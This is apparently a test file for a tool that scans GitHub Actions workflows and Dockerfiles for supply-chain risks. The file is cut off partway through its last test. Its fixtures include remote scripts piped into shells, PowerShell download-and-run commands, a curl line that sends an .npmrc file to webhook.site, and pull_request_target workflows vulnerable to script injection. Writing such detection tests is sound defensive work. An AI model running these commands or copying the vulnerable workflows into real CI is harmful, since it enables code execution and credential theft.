import assert from 'node:assert/strict'
import { describe, it } from 'node:test'
import { keptSource, resolveAction, scanWorkflow, usesOfKey } from '../risk/index.js'
import { readUses, usesKey } from '../risk/actions/uses.js'
import { dockerfileFindings, latestOf, newestOfLines, tagVersion } from '../risk/actions/resolve.js'
import { scriptFinds } from '../risk/actions/scripts/commands.js'
import { lockedName, scriptFindings } from '../risk/actions/scripts/grade.js'
import { actionsSourceOf } from './_actions-source.js'

const SHA = char => char.repeat(40)
const ids = findings => findings.map(({ id, severity, line }) => `${id}/${severity}${line === undefined ? '' : `@${line}`}`)

describe('a uses: as GitHub reads it', () => {
  it('an action, a reusable workflow, the repository\'s own, an image, or none GitHub runs', () => {
    assert.deepEqual(readUses('actions/checkout@v4'), { kind: 'action', uses: 'actions/checkout@v4', repo: 'actions/checkout', path: '', ref: 'v4', pin: 'ref', comment: null })
    assert.deepEqual(readUses(`github/codeql-action/init@${SHA('a')}`, { comment: '# v3.28.0' }),
      { kind: 'action', uses: `github/codeql-action/init@${SHA('a')}`, repo: 'github/codeql-action', path: 'init', ref: SHA('a'), pin: 'sha', comment: 'v3.28.0' })
    assert.equal(readUses('org/repo/.github/workflows/ci.yml@main', { job: true }).kind, 'workflow')
    assert.equal(readUses('org/repo/sub@main', { job: true }).kind, 'invalid', 'a job uses a workflow file alone')
    assert.deepEqual(readUses('./.github/actions/setup/'), { kind: 'local', uses: './.github/actions/setup/', path: '.github/actions/setup' })
    assert.deepEqual(readUses('$/.github/actions/setup'), { kind: 'local', uses: '$/.github/actions/setup', path: '.github/actions/setup', self: true })
    assert.deepEqual(readUses('docker://alpine:3.20'), { kind: 'docker', uses: 'docker://alpine:3.20', image: 'alpine', tag: '3.20', digest: null })
    assert.equal(readUses(`docker://ghcr.io:443/o/i@sha256:${'b'.repeat(64)}`).digest, `sha256:${'b'.repeat(64)}`)
    for (const bad of ['actions/checkout', 'actions@v1', '-bad/x@v1', 'a/b/../c@v1', '${{ x }}@v1', 'docker://']) assert.equal(readUses(bad).kind, 'invalid', bad)
  })

  it('a pin: a full commit, a short one GitHub reads a branch or tag as too, or a ref', () => {
    assert.equal(readUses(`a/b@${SHA('c')}`).pin, 'sha')
    assert.equal(readUses('a/b@abc1234').pin, 'short-sha')
    assert.equal(readUses('a/b@v1.2.3').pin, 'ref')
    assert.equal(readUses('a/b@release/v1').ref, 'release/v1')
  })

  it('the version a comment beside a pin names, as Dependabot, Renovate, pinact and ratchet write one', () => {
    for (const [comment, version] of [['# v4.1.1', 'v4.1.1'], ['#v4', 'v4'], ['# tag=v4.1.1', 'v4.1.1'], ['# pin@v2', 'v2'], ['# ratchet:actions/checkout@v4', 'v4'],
      ['# 1.2.3', '1.2.3'], ['# needed for x', null], ['# v4 is fine', 'v4'], ['# v4x', null]]) {
      assert.equal(readUses(`a/b@${SHA('d')}`, { comment }).comment, version, comment)
    }
  })

  it('is resolved once by its key, a commit\'s with its comment', () => {
    const uses = readUses(`Org/Repo/sub@${SHA('e')}`, { comment: '# v1.0.0' })
    assert.equal(usesKey(uses), `org/repo/sub@${SHA('e')} # v1.0.0`)
    assert.equal(usesKey(readUses('Org/Repo@v1', { comment: '# v1.0.0' })), 'org/repo@v1', 'a ref is resolved whatever its comment')
    assert.deepEqual(usesOfKey(usesKey(uses)), { ...readUses(`org/repo/sub@${SHA('e')}`, { comment: '# v1.0.0' }) })
    assert.equal(usesOfKey('org/repo/.github/workflows/x.yml@v1').kind, 'workflow')
    assert.equal(usesOfKey('not a key'), null)
    assert.equal(usesOfKey('org/repo@release#1').ref, 'release#1', 'a ref with a # in it')
  })
})

describe('what a script runs past a pin', () => {
  const finds = script => scriptFinds(script).map(({ kind, tool, name, spec, exact, line }) => [kind, tool ?? null, name ?? null, spec ?? null, exact ?? null, line])

  it('npm\'s tools: npx and its kin, by the package they run', () => {
    assert.deepEqual(finds('npx eslint .\nnpx --yes tool@1.2.3 --flag\nnpx -p @scope/pkg@latest cmd\nnpx --no-install tsc\nnpx -c "echo"\nnpm exec -- vitest@3.0.0\nbunx cowsay\nbun x cowsay@1.0.0'), [
      ['package', 'npx', 'eslint', null, false, 0], ['package', 'npx', 'tool', '1.2.3', true, 1], ['package', 'npx', '@scope/pkg', 'latest', false, 2],
      ['package', 'npm exec', 'vitest', '3.0.0', true, 5], ['package', 'bunx', 'cowsay', null, false, 6], ['package', 'bun x', 'cowsay', '1.0.0', true, 7],
    ])
    assert.deepEqual(finds('pnpm dlx create-next-app@14.0.0\npnpx degit x\nyarn dlx @yarnpkg/sdks\nnpm create vite@latest app\nnpm init -y\nyarn create @scope\nnpm i -g pnpm@9.1.0 typescript').map(([, tool, name, spec]) => [tool, name, spec]), [
      ['pnpm dlx', 'create-next-app', '14.0.0'], ['pnpx', 'degit', null], ['yarn dlx', '@yarnpkg/sdks', null], ['npm create', 'create-vite', 'latest'],
      ['yarn create', '@scope/create', null], ['npm i -g', 'pnpm', '9.1.0'], ['npm i -g', 'typescript', null],
    ])
  })

  it('installs that resolve anew, and those that hold to the lockfile', () => {
    assert.deepEqual(finds('npm ci\nnpm install\npnpm install --frozen-lockfile\npnpm i --no-frozen-lockfile\nyarn\nyarn install --frozen-lockfile\nyarn build\nbun install\nnpm update').map(([kind, tool, , , , line]) => [kind, tool, line]), [
      ['unlocked-install', 'npm install', 1], ['unlocked-install', 'pnpm i --no-frozen-lockfile', 3], ['unlocked-install', 'yarn', 4], ['unlocked-install', 'bun install', 7], ['unlocked-install', 'npm update', 8],
    ])
    assert.deepEqual(finds('npm install --save-dev left-pad ./local file:../x'), [['package', 'npm install', 'left-pad', null, false, 0]])
  })

  it('a script fetched and run: piped to a shell, substituted, or saved and then run', () => {
    for (const script of ['curl -fsSL https://x/i.sh | sudo -E bash -', 'wget -qO- https://x.sh | sh', 'bash <(curl -s https://codecov.io/bash)',
      'sh -c "$(curl -fsSL https://x/install.sh)"', 'iex ((New-Object Net.WebClient).DownloadString("https://x/y.ps1"))', 'irm https://x | iex',
      'curl -sSLo i.sh https://x/i.sh\nchmod +x i.sh\n./i.sh', 'wget -qO- https://x/a.sh > a.sh; bash a.sh', 'curl -O https://x/setup.sh && sh setup.sh']) {
      assert.ok(scriptFinds(script).some(({ kind }) => kind === 'remote-script'), script)
    }
    for (const script of ['curl -fsSL https://api.github.com/repos/x/y | jq .name', 'curl -o out.json https://x\ncat out.json', 'echo "curl x | sh"']) {
      assert.ok(!scriptFinds(script).some(({ kind }) => kind === 'remote-script'), script)
    }
  })

  it('other ecosystems\' tools, images and clones', () => {
    assert.deepEqual(finds('pip install --upgrade pip\npip install requests==2.31.0 flask\npython -m pip install -r requirements.txt\npip install git+https://github.com/x/y\nuvx ruff\npipx run --spec black==24.1.0 black .').map(([, tool, name, spec, exact]) => [tool, name, spec, exact]), [
      ['pip', 'pip', null, false], ['pip', 'requests', '==2.31.0', true], ['pip', 'flask', null, false], ['pip', 'git+https://github.com/x/y', null, false], ['uvx', 'ruff', null, false], ['pipx run', 'black', '==24.1.0', true],
    ])
    assert.deepEqual(finds('go install golang.org/x/tools/cmd/goimports@latest\ngo install github.com/x/y@v1.2.3\ncargo install cargo-audit\ncargo install --locked cargo-deny@0.14.0\ngem install bundler -v 2.4.22\ndeno run npm:cowsay@1.5.0').map(([, tool, name, spec, exact]) => [tool, name, spec, exact]), [
      ['go install', 'golang.org/x/tools/cmd/goimports', 'latest', false], ['go install', 'github.com/x/y', 'v1.2.3', true], ['cargo install', 'cargo-audit', null, false],
      ['cargo install', 'cargo-deny', '0.14.0', true], ['gem install', 'bundler', '2.4.22', true], ['deno run', 'cowsay', '1.5.0', true],
    ])
    assert.deepEqual(scriptFinds('docker run --rm -v $PWD:/w -w /w node:20 npm test\ngit clone https://github.com/x/y.git && make').map(({ kind, text, url }) => [kind, text ?? url]),
      [['image', 'node:20'], ['clone', 'https://github.com/x/y.git']])
  })

  it('past settings, wrappers and comments, and in what a substitution runs', () => {
    assert.deepEqual(finds('FOO=1 sudo -u ci env A=b npx cowsay \\\n  --arg\n# npx commented\necho done # npx neither\nV=$(npx -y semver@7.5.0 -i patch 1.0.0)').map(([, tool, name, , , line]) => [tool, name, line]),
      [['npx', 'cowsay', 0], ['npx', 'semver', 4]])
  })
})

describe('a script\'s findings, graded', () => {
  const run = script => ({ script, line: 10, start: 11 })
  const graded = (script, context = {}) => ids(scriptFindings(run(script), { locked: () => false, installed: () => false, external: false, triggers: [], ...context }))

  it('npx runs the project\'s own where a lockfile locks it and it was installed, before or earlier in the script', () => {
    const locked = name => lockedName(new Set(['eslint', 'typescript']), name)
    assert.deepEqual(graded('npx eslint .', { locked }), ['fetched-package/high@11'], 'before any install')
    assert.deepEqual(graded('npx eslint .', { locked, installed: () => true }), [])
    assert.deepEqual(graded('npm ci\nnpx eslint .\nnpx tsc', { locked }), [], 'an install earlier in the script, tsc by typescript\'s')
    assert.deepEqual(graded('npm ci && npx eslint .', { locked }), [], 'an install earlier on its line')
    assert.deepEqual(graded('npx eslint . && npm ci', { locked }).length, 1, 'and one after it')
    assert.deepEqual(graded('npm ci --prefix web && npm ci && npx eslint .', { locked }), [], 'any install before it, not the first alone')
    assert.deepEqual(graded('bash -c \'npx eslint .\' && npm ci', { locked }).length, 1, 'a shell\'s command line where the shell runs')
    assert.deepEqual(graded('echo "$(npx eslint --version)" && npm ci', { locked }).length, 1, 'a command substitution before its command')
    assert.deepEqual(graded('npm ci && echo "$(npx eslint --version)"', { locked }), [], 'and after an install before it')
    assert.deepEqual([graded('npm ci --prefix . && npx eslint .', { locked }), graded('pnpm -C ./ install && npx eslint .', { locked })], [[], []], 'an install naming its own directory')
    const dev = () => 'dev'
    assert.deepEqual([graded('npm ci --omit=dev && npx eslint .', { locked: dev }).length, graded('npm ci --omit=dev && npx eslint .', { locked }).length], [1, 0],
      'one leaving devDependencies out, for one only they need')
    assert.deepEqual(graded('npx eslint .', { locked: dev, installed: only => !only }).length, 1, 'and in a step before')
    assert.deepEqual([graded('NODE_ENV=production npm ci && npx eslint .', { locked: dev }).length, graded('export NODE_ENV=production\nnpm ci\nnpx eslint .', { locked: dev }).length,
      graded('NODE_ENV=production npm ci --include=dev && npx eslint .', { locked: dev }).length], [1, 1, 0], 'NODE_ENV production, of the command or exported')
    assert.deepEqual([graded('NODE_ENV=production npm ci --include dev && npx eslint .', { locked: dev }), graded('npm ci --omit=dev --include=dev && npx eslint .', { locked: dev })], [[], []],
      'devDependencies included, whatever leaves them out')
    assert.deepEqual(graded('npm ci --prefix web\nnpx eslint .', { locked }).length, 1, 'an install earlier in the script, of another directory')
    assert.deepEqual([graded('npm ci --dry-run && npx eslint .', { locked }).length, graded('npm ci --dry-run=true && npx eslint .', { locked }).length], [1, 1], 'one that installs nothing')
    assert.deepEqual(graded('bash -euc "npx left-pad"\n/bin/sh -c \'curl -fsSL https://x/i.sh | sh\'\nash -c "npx is-odd"'), ['fetched-package/high@11', 'remote-script/high@12', 'fetched-package/high@13'], 'a shell\'s command line')
    assert.deepEqual(graded('pwsh -NoProfile -ExecutionPolicy Bypass -Command \'iwr https://x/s -OutFile s.ps1; ./s.ps1\'\npowershell -noninteractive -c \'iwr https://x/t -OutFile t.ps1; ./t.ps1\''),
      ['remote-script/high@11', 'remote-script/high@12'], 'PowerShell\'s, by -Command in any case')
    assert.deepEqual(graded('npx left-pad', { locked, installed: () => true }), ['fetched-package/high@11'], 'locked by none')
    assert.deepEqual(graded('npx left-pad@1.3.0', { installed: () => true }), ['fetched-package/moderate@11'], 'a version, not its integrity')
    const versions = name => lockedName(new Set(['eslint', 'eslint@8.57.0']), name)
    assert.deepEqual(graded('npm ci\nnpx eslint@8.57.0 .\nnpx eslint@v9.0.0 .', { locked: versions }), ['fetched-package/moderate@13'], 'a version, the project\'s own where a lockfile locks that one')
    assert.deepEqual(graded('npm i -g corepack@${V}'), ['fetched-package/moderate@11'], 'a version a variable names')
    assert.deepEqual(graded('npx eslint', { external: true, installed: () => true }), [], 'another\'s action, in a workspace that installed')
  })

  it('an install in a step before counts where node finds what it installed: its directory or one below', () => {
    const lockfiles = [{ path: 'api/package-lock.json', names: new Set(['eslint']) }, { path: 'package-lock.json', names: new Set(['eslint']) }]
    const job = (install, runs, command = 'npm ci') => `on: push\njobs:\n  a:\n    steps:\n      - run: ${command}\n        working-directory: ${install}\n      - run: npx eslint .\n        working-directory: ${runs}\n`
    assert.deepEqual(ids(scanWorkflow('workflow', job('web', 'api'), { lockfiles }).findings), ['fetched-package/high@7'], 'web installed, api not')
    assert.deepEqual(ids(scanWorkflow('workflow', job('.', 'api'), { lockfiles }).findings), [], 'installed above it')
    assert.deepEqual(ids(scanWorkflow('workflow', job('api', 'api'), { lockfiles }).findings), [])
    const nested = [{ path: 'api/package-lock.json', names: new Set() }, { path: 'package-lock.json', names: new Set(['eslint']) }]
    assert.deepEqual(ids(scanWorkflow('workflow', job('api', 'api'), { lockfiles: nested }).findings), ['fetched-package/high@7'], 'locked above, by another project\'s lockfile than its own')
    const script = (lines, locks) => ids(scanWorkflow('workflow', `on: push\njobs:\n  a:\n    steps:\n      - run: |\n${lines.map(line => `          ${line}\n`).join('')}`, { lockfiles: locks }).findings)
    const own = [{ path: 'api/package-lock.json', names: new Set(['eslint']) }]
    assert.deepEqual([script(['cd api && npm ci && npx eslint .'], own), script(['cd api && npm ci && npx eslint .'], nested), script(['cd ./api', 'npm ci', 'cd ..', 'npx eslint .'], own)],
      [[], ['fetched-package/high@6'], ['fetched-package/high@9']], 'where a script\'s cd moves to, and back')
    assert.deepEqual([ids(scanWorkflow('workflow', job('.', 'api', 'cd api && npm ci'), { lockfiles }).findings), ids(scanWorkflow('workflow', job('.', 'web', 'cd api && npm ci'), { lockfiles }).findings)],
      [[], ['fetched-package/high@7']], 'and an install there, in a step before')
    assert.deepEqual(ids(scanWorkflow('workflow', job('.', 'api', 'npm ci --prefix web'), { lockfiles }).findings), ['fetched-package/high@7'], 'the directory an install names')
    assert.deepEqual(ids(scanWorkflow('workflow', job('web', 'api', 'pnpm -C ../api install'), { lockfiles }).findings), [])
    assert.deepEqual(ids(scanWorkflow('workflow', job('.', 'api', 'npm --prefix=api ci'), { lockfiles }).findings), [], 'its option before its command')
    assert.deepEqual(ids(scanWorkflow('workflow', job('.', 'api', 'npm ci --prefix web && npm ci --prefix api'), { lockfiles }).findings), [], 'each install of a script')
    const devLocked = [{ path: 'package-lock.json', names: new Set(['eslint', 'typescript']), dev: new Set(['typescript']) }]
    assert.deepEqual(ids(scanWorkflow('workflow', job('.', '.', 'npm ci --omit dev'), { lockfiles: devLocked }).findings), [], 'a package more than devDependencies need')
    assert.deepEqual(ids(scanWorkflow('workflow', job('.', '.', 'npm ci --omit dev').replace('npx eslint', 'npx tsc'), { lockfiles: devLocked }).findings), ['fetched-package/high@7'], 'one only they need, by its program')
    const production = job('.', '.', 'npm ci').replace('npx eslint', 'npx tsc').replace('jobs:', 'env:\n  NODE_ENV: production\njobs:')
    assert.deepEqual(ids(scanWorkflow('workflow', production, { lockfiles: devLocked }).findings), ['fetched-package/high@9'], 'the workflow\'s env setting NODE_ENV to production')
    assert.deepEqual(ids(scanWorkflow('workflow', job('api', 'api', 'npm i -g pnpm'), { lockfiles }).findings), ['fetched-package/high@5', 'fetched-package/high@7'], 'a global install, itself fetched')
    assert.deepEqual(ids(scanWorkflow('workflow', job('api', 'api', 'npm install --package-lock-only'), { lockfiles }).findings), ['unlocked-install/moderate@5', 'fetched-package/high@7'], 'one writing the lockfile alone')
    assert.deepEqual(ids(scanWorkflow('workflow', job('${{ matrix.project }}', 'api'), { lockfiles }).findings), ['fetched-package/high@7'], 'one an expression names, for another')
    assert.deepEqual(ids(scanWorkflow('workflow', job('${{ matrix.project }}', '${{ matrix.project }}'), { lockfiles }).findings), [], 'and for the same')
    assert.deepEqual(ids(scanWorkflow('workflow', job('${{ matrix.project }}', '${{ matrix.project }}'), { lockfiles: lockfiles.slice(0, 1) }).findings), ['fetched-package/high@7'], 'its lockfiles those above any directory')
  })

  it('an action of the repository\'s own counts as an install where it installs', () => {
    const lockfiles = [{ path: 'package-lock.json', names: new Set(['eslint']) }]
    const workflow = 'on: push\njobs:\n  a:\n    steps:\n      - uses: ./.github/actions/setup\n      - run: npx eslint .\n'
    const scan = actions => ids(scanWorkflow('workflow', workflow, { lockfiles, actions: actions && new Map(Object.entries(actions)) }).findings)
    const action = script => `runs:\n  using: composite\n  steps:\n    - run: ${script}\n      shell: bash\n`
    assert.deepEqual(scan({ '.github/actions/setup': action('npm ci') }), [])
    assert.deepEqual([scan({}), scan({ '.github/actions/setup': action('npm run lint') }), scan({ '.github/actions/setup': 'runs: [' })], [['fetched-package/high@6'], ['fetched-package/high@6'], ['fetched-package/high@6']],
      'none, one that doesn\'t, one GitHub can\'t run')
    assert.deepEqual(scan({ '.github/actions/setup': action('npm ci --prefix web') }), ['fetched-package/high@6'], 'one that installs another directory\'s')
    assert.deepEqual(scan(undefined), [], 'none told')
    const wrapper = 'runs:\n  using: composite\n  steps:\n    - uses: ./lint\n'
    assert.deepEqual([scan({ '.github/actions/setup': wrapper, lint: action('npm ci') }), scan({ '.github/actions/setup': wrapper, lint: wrapper.replace('./lint', './.github/actions/setup') })],
      [[], ['fetched-package/high@6']], 'one using an action of its own, by that one, however they use each other')
  })

  it('a privileged workflow checking out a fork\'s repository, at its default branch', () => {
    const job = (on, repository) => `on: ${on}\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@${SHA('c')}\n        with:\n          repository: \${{ ${repository} }}\n`
    assert.deepEqual(ids(scanWorkflow('workflow', job('pull_request_target', 'github.event.pull_request.head.repo.full_name')).findings), ['pwn-request/critical@7'])
    assert.deepEqual(ids(scanWorkflow('workflow', job('workflow_run', 'github.event.workflow_run.head_repository.full_name')).findings), ['pwn-request/critical@7'])
    assert.deepEqual(ids(scanWorkflow('workflow', job('pull_request_target', 'github.event.pull_request.merge_commit_sha')).findings), ['pwn-request/critical@7'], 'its merge commit')
    assert.deepEqual(ids(scanWorkflow('workflow', job('workflow_run', 'github.event.workflow_run.pull_requests[0].head.sha')).findings), ['pwn-request/critical@7'], 'its run\'s pull request\'s')
    assert.deepEqual(ids(scanWorkflow('workflow', job('pull_request_target', "github.event['pull_request']['head']['sha']")).findings), ['pwn-request/critical@7'], 'by index syntax')
    assert.deepEqual(ids(scanWorkflow('workflow', job('pull_request_target', 'github.repository')).findings), [], 'its own')
  })

  it('an input an action of its own writes into a script, from an expression anyone can write', () => {
    const workflow = `on: pull_request_target\njobs:\n  a:\n    steps:\n      - uses: ./.github/actions/greet\n        with:\n          title: \${{ github.event.pull_request.title }}\n          body: \${{ github.event.pull_request.body }}\n          branch: \${{ github.head_ref }}\n`
    const action = 'runs:\n  using: composite\n  steps:\n    - run: echo "${{ inputs.title }} ${{ inputs[\'branch\'] }}"\n      shell: bash\n    - run: echo "$BODY"\n      env:\n        BODY: ${{ inputs.body }}\n      shell: bash\n'
    const scan = actions => ids(scanWorkflow('workflow', workflow, { actions }).findings)
    assert.deepEqual([scan(new Map([['.github/actions/greet', action]])), scan(null)], [['script-injection/critical@7', 'script-injection/critical@9'], []], 'by either syntax, not one it sets in env')
  })

  it('a workflow_run\'s artifacts taken by the GitHub CLI', () => {
    const found = on => ids(scanWorkflow('workflow', `on: ${on}\njobs:\n  a:\n    steps:\n      - run: gh run download \${{ github.event.workflow_run.id }}\n`).findings)
    assert.deepEqual([found('workflow_run'), found('push')], [['untrusted-artifact/high@5'], []])
  })

  it('an action that installs a project\'s packages, by its name, not another tool\'s', () => {
    const lockfiles = [{ path: 'package-lock.json', names: new Set(['eslint']) }]
    const found = uses => ids(scanWorkflow('workflow', `on: push\njobs:\n  a:\n    steps:\n      - uses: ${uses}\n      - run: npx eslint .\n`, { lockfiles }).findings)
      .filter(id => id.startsWith('fetched-package'))
    assert.deepEqual([found('bahmutov/npm-install@v1'), found('cypress-io/github-action@v6')], [[], []])
    assert.deepEqual([found('cachix/install-nix-action@v27'), found('actions/setup-node@v4')], [['fetched-package/high@6'], ['fetched-package/high@6']])
  })

  it('other tools by how they are pinned', () => {
    assert.deepEqual(graded('pip install --upgrade pip setuptools\npip install flask==3.0.0\npip install flask'), ['fetched-package/notice@11', 'fetched-package/notice@11', 'fetched-package/moderate@12', 'fetched-package/high@13'])
    assert.deepEqual(graded('go install x.dev/y@v1.2.3\ngo install x.dev/y@latest'), ['fetched-package/high@12'], 'a Go version held to its checksum database')
    assert.deepEqual(graded('cargo install --locked x@1.0.0\ncargo install x@1.0.0\ncargo install --locked x@1.0.0 y'), ['fetched-package/moderate@12', 'fetched-package/high@13'], 'each crate')
    assert.deepEqual(graded('npm install\nyarn\nbun install'), ['unlocked-install/moderate@11', 'unlocked-install/low@12', 'unlocked-install/low@13'])
    assert.deepEqual(graded('docker run alpine\ndocker run node:20\ndocker pull node@sha256:' + 'c'.repeat(64)), ['unpinned-image/high@11', 'unpinned-image/moderate@12'])
  })

  it('a fork\'s repository\'s description, which its owner writes, and a script saved by curl\'s -o joined to its file', () => {
    assert.deepEqual(graded('echo "${{ github.event.pull_request.head.repo.description }}"\necho "${{ github.event.workflow_run.head_repository.homepage }}"'),
      ['script-injection/high@11', 'script-injection/high@12'])
    assert.deepEqual(graded('curl -fsSLo/tmp/setup https://x/s.sh && sh /tmp/setup\nwget -qO- https://x/a.txt\nwget https://x/install.sh && sh install.sh\niwr https://x/s -OutFile setup.ps1; pwsh ./setup.ps1\ncurl -o env.sh https://x/e && . ./env.sh'), ['remote-script/high@11', 'remote-script/high@13', 'remote-script/high@14', 'remote-script/high@15'])
    assert.deepEqual(graded('echo "${{ github.event.workflow_run.head_repository.default_branch }}"'), ['script-injection/high@11'])
    assert.deepEqual(graded('echo "${{ github[\'event\'][ \'pull_request\' ].title }}"'), ['script-injection/high@11'], 'by index syntax')
    assert.deepEqual(graded('curl -fsSL https://x/i.sh |\n  sh\n# a |\nnpx left-pad'), ['remote-script/high@11', 'fetched-package/high@14'], 'a pipe the next line goes on from, not a comment\'s')
    const call = `on: pull_request_target\njobs:\n  a:\n    uses: org/wf/.github/workflows/x.yml@${SHA('a')}\n    with:\n      title: \${{ github.event.pull_request.title }}\n      ref: \${{ github.sha }}\n`
    assert.deepEqual(ids(scanWorkflow('workflow', call).findings), ['script-injection/critical@6'], 'one handed to a reusable workflow, which writes its inputs into its scripts')
  })

  it('services that exfiltrate, by risk\'s tags, and expressions anyone can write', () => {
    assert.deepEqual(graded('curl -d @$HOME/.npmrc https://webhook.site/x\ncurl https://ipinfo.io'), ['hosts/critical@11', 'hosts/moderate@12'])
    assert.deepEqual(graded('echo "${{ github.event.issue.title }}"\necho "${{ github.sha }}"'), ['script-injection/high@11'])
    assert.deepEqual(graded('echo "${{ github.head_ref }}"', { triggers: ['pull_request_target'] }), ['script-injection/critical@11'])
  })

  it('on its own lines where it is a `|` block scalar, else on its key\'s', () => {
    assert.deepEqual(ids(scriptFindings({ script: 'a\nb\ncurl x | sh', line: 4, start: null }, { locked: () => false, installed: () => false, external: false, triggers: [] })), ['remote-script/high@4'])
  })
})

const WORKFLOW = `on:
  pull_request_target:
  workflow_run:
    workflows: [build]
jobs:
  test:
    runs-on: ubuntu-latest
    container: node:20
    services:
      redis:
        image: redis@sha256:${'d'.repeat(64)}
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}
      - uses: myorg/shared-action@main
      - uses: third/party@v1
      - uses: third/pinned@${SHA('a')} # v1.0.0
      - uses: third/short@abc1234
      - uses: docker://alpine:3.20
      - uses: ./.github/actions/setup
      - run: |
          npx eslint .
          npx left-pad
        working-directory: web
      - uses: actions/github-script@v7
        with:
          script: |
            core.info("\${{ github.event.comment.body }}")
      - uses: actions/download-artifact@v4
        with:
          run-id: \${{ github.event.workflow_run.id }}
  reuse:
    uses: third/workflows/.github/workflows/deploy.yml@v1
    secrets: inherit
`

describe('a workflow\'s findings by its own text', () => {
  it('each uses:, image and step, graded, on its line', () => {
    const scan = scanWorkflow('workflow', WORKFLOW, { owner: 'myorg', lockfiles: [{ path: 'web/package-lock.json', names: new Set(['eslint']) }, { path: 'api/package-lock.json', names: new Set(['left-pad']) }] })
    assert.deepEqual(ids(scan.findings), [
      'unpinned-image/moderate@8', 'unpinned/moderate@13', 'pwn-request/critical@15', 'unpinned/moderate@16', 'unpinned/high@17', 'short-sha/high@19', 'unpinned-image/moderate@20',
      // eslint locked by web's lockfile and installed by the local action; left-pad only api's.
      'fetched-package/high@24', 'unpinned/moderate@26', 'script-injection/critical@28', 'unpinned/moderate@30', 'untrusted-artifact/high@30', 'unpinned/high@34', 'secrets-inherited/high@34',
    ])
    assert.deepEqual(scan.uses.map(({ kind, uses, line }) => [kind, uses, line]), [
      ['action', 'actions/checkout@v4', 13], ['action', 'myorg/shared-action@main', 16], ['action', 'third/party@v1', 17], ['action', `third/pinned@${SHA('a')}`, 18],
      ['action', 'third/short@abc1234', 19], ['local', './.github/actions/setup', 21], ['action', 'actions/github-script@v7', 26], ['action', 'actions/download-artifact@v4', 30],
      ['workflow', 'third/workflows/.github/workflows/deploy.yml@v1', 34],
    ])
    assert.equal(scan.uses[3].comment, 'v1.0.0')
  })

  it('an action\'s metadata: its runtime, its composite steps', () => {
    const scan = scanWorkflow('action', 'name: x\nruns:\n  using: node16\n  main: index.js\n')
    assert.deepEqual(ids(scan.findings), ['deprecated-runtime/low@3'])
    assert.deepEqual(ids(scanWorkflow('action', 'runs:\n  using: composite\n  steps:\n    - uses: a/b@main\n    - run: pnpm dlx x\n      shell: bash\n', { owner: 'a', external: true }).findings),
      ['unpinned/moderate@4', 'fetched-package/high@5'])
    assert.deepEqual(ids(scanWorkflow('action', `runs:\n  using: docker\n  image: docker://alpine@sha256:${'e'.repeat(64)}\n`).findings), [])
    assert.deepEqual(ids(scanWorkflow('action', 'runs:\n  using: docker\n  image: docker://alpine\n').findings), ['unpinned-image/high@3'])
  })

  it('refuses what isn\'t YAML, a tag making code among it, or isn\'t a workflow', () => {
    for (const text of ['on: push\njobs:\n  a:\n    steps:\n      - run: !!js/function "function () {}"\n', 'jobs: &j {}\nx:\n  <<: *j\n', 'a:\n\tb: 1\n', '- a\n', 'on: push\n']) {
      assert.equal(scanWorkflow('workflow', text).error, 'workflow-unreadable', JSON.stringify(text))
    }
    assert.deepEqual(scanWorkflow('action', 'name: x\n'), { error: 'workflow-unreadable', detail: 'an action has no runs.using' })
    const read = scanWorkflow('workflow', "on: push\njobs:\n  a:\n    steps:\n      - run: 'function () { return 1 }'\n")
    assert.deepEqual(read.findings, [], 'a function\'s text is a script\'s, run by a shell, not code made of it')
  })
})

describe('a Dockerfile\'s findings', () => {
  it('its images by a tag and what its RUN commands fetch, each on its line', () => {
    assert.deepEqual(ids(dockerfileFindings(`FROM node:20 AS build\nRUN npm ci && \\\n    curl -fsSL https://x/i.sh | sh\nFROM build\nFROM alpine@sha256:${'a'.repeat(64)}\nFROM python:\${PY}\nRUN ["pip", "install", "requests"]\nRUN ["sh", "-c", "pip install flask"]\nRUN --mount=type=cache,target=/root/.cache --network=default pip install requests\nFROM scratch`)),
      ['unpinned-image/moderate@1', 'remote-script/high@2', 'unpinned-image/moderate@6', 'fetched-package/high@7', 'fetched-package/high@8', 'fetched-package/high@9'])
    assert.deepEqual(ids(dockerfileFindings('FROM scratch\nRUN <<EOF\nset -e\ncurl -fsSL https://x/i.sh | sh\nEOF\nRUN echo done')), ['remote-script/high@4'], 'a heredoc\'s script')
    assert.deepEqual(ids(dockerfileFindings('FROM scratch\nRUN <<\'SCRIPT-END\'\necho hi\nSCRIPT-END\nFROM node:20')), ['unpinned-image/moderate@5'], 'one whose delimiter is more than a word\'s letters')
  })
})


// An action's repository: main at A, its history A > B > C; v1.0.0 at C,
// v1.1.0 and the v1 that moves with it at B, v2.0.0 at A, and v2 moved to D,
// a commit on no branch; `latest` at A.
const ACT = {
  info: { fullName: 'org/act', defaultBranch: 'main' },
  tags: [{ tag: 'v1.0.0', oid: SHA('c') }, { tag: 'v1.1.0', oid: SHA('b') }, { tag: 'v1', oid: SHA('b') }, { tag: 'v2.0.0', oid: SHA('a') }, { tag: 'v2', oid: SHA('d') }, { tag: 'latest', oid: SHA('a') }],
  branches: [{ branch: 'main', oid: SHA('a') }, { branch: 'dev', oid: SHA('9') }],
  history: { main: [SHA('a'), SHA('b'), SHA('c')], [SHA('a')]: [SHA('a'), SHA('b'), SHA('c')], [SHA('b')]: [SHA('b'), SHA('c')] },
  missing: [SHA('0')],
  files: {
    [`action.yml@${SHA('b')}`]: 'runs:\n  using: composite\n  steps:\n    - uses: other/thing@main\n    - uses: $/sub\n    - run: curl -sSL https://x/y.sh | bash\n      shell: bash\n',
    [`action.yml@${SHA('a')}`]: 'runs:\n  using: docker\n  image: Dockerfile\n',
    [`Dockerfile@${SHA('a')}`]: 'FROM alpine\n',
    [`action.yaml@${SHA('c')}`]: 'runs:\n  using: node20\n  main: index.js\n',
  },
}

describe('a reference resolved on GitHub', () => {
  const resolve = async (text, comment = null, repos = null, owner = 'me') => {
    const source = actionsSourceOf(repos ?? { 'org/act': ACT })
    const resolved = await resolveAction(readUses(text, { comment }), source, { owner })
    return { ...resolved, asked: source.asked, found: ids(resolved.findings) }
  }

  it('a moving tag where its line\'s release is, an older line than the latest, and its code', async () => {
    const v1 = await resolve('org/act@v1')
    assert.deepEqual([v1.at, v1.commit, v1.tags], ['tag', SHA('b'), ['v1.1.0', 'v1']])
    assert.deepEqual(v1.found, ['outdated/low', 'unpinned/high@4', 'remote-script/high@6'])
    assert.deepEqual(v1.findings.slice(1).map(({ file }) => file), ['action.yml', 'action.yml'])
